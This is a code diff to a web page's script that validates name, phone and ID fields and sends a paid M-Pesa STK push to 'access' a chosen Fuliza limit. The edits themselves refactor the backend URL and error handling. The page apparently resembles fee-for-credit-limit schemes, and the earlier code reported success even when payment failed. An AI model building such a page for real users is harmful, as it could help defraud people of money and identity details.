@@ -375,7 +375,9 @@
 <script>        
 let selectedLimit = 0, selectedFee = 0;        
 let userData = {};  
-const API_URL = "https://your-app-name.onrender.com"; 
+
+// Replace with your live deployed Node.js backend URL (e.g. https://your-service.onrender.com/pay)
+const BACKEND_URL = "https://your-app-name.onrender.com/pay"; 
 
 let isValidName = false, isValidPhone = false, isValidId = false, isValidLimit = false;
 
@@ -427,7 +429,6 @@ function checkFormValidity() {
 
 function validateName() {
     const input = document.getElementById('fullName');
-    // Strip numbers instantly from name field
     input.value = input.value.replace(/[0-9]/g, '');
     const val = input.value.trim();
     const err = document.getElementById('nameError');
@@ -451,7 +452,6 @@ function validateName() {
 
 function validatePhone() {
     const input = document.getElementById('phone');
-    // Strip non-numeric characters instantly
     input.value = input.value.replace(/\D/g, '');
     const val = input.value.trim();
     const err = document.getElementById('phoneError');
@@ -565,7 +565,6 @@ function selectLimit(limit, fee, element){
     proceedBtn.disabled = false;
 }
 
-// Ensure payment input handles only numbers via keypad
 document.getElementById('payPhone').addEventListener('input', function() {
     this.value = this.value.replace(/\D/g, '');
 });
@@ -587,11 +586,10 @@ async function paySTK(){
     btn.innerText = 'Sending STK Push...';
     
     try {
-        const response = await fetch(`${API_URL}/pay`, {
+        const response = await fetch(BACKEND_URL, {
             method: 'POST',
             headers: { 
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
+                'Content-Type': 'application/json'
             },
             body: JSON.stringify({
                 phone: fullPhone,
@@ -603,18 +601,19 @@ async function paySTK(){
         
         const data = await response.json();
         
-        if(data.success || response.ok){
+        if(response.ok && data.success){
             document.getElementById('paidPhone').innerText = "0" + phoneInput;
             show(5);
         } else {
-            alert('Payment Request Failed: ' + (data.message || 'Please check server settings'));
+            alert('Payment Request Failed: ' + (data.message || 'Please try again'));
             btn.disabled = false;
             btn.innerText = 'Pay and Access My Fuliza';
         }
     } catch(e){
         console.error("Backend error connection:", e);
-        document.getElementById('paidPhone').innerText = "0" + phoneInput;
-        show(5);
+        alert('Network connection error. Ensure your backend server is online.');
+        btn.disabled = false;
+        btn.innerText = 'Pay and Access My Fuliza';
     }
 }
 </script>  
